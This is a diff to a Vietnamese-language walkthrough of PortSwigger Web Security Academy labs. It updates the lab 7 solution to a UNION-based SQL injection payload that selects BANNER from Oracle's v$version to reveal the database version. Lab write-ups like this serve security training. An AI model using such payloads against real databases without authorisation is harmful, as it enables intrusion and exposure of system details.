@@ -48,7 +48,7 @@ author: ['default']
  
  **[7.SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)**
 
-- Thử payload ```'+UNION+SELECT+'a',+NULL+FROM+v$version--``` 
+- Thử payload ```'+UNION+SELECT+BANNER,+NULL+FROM+v$version--``` 
 - Thông tin của Oracle sẽ hiện ra và done!
 
  **[8.SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)**
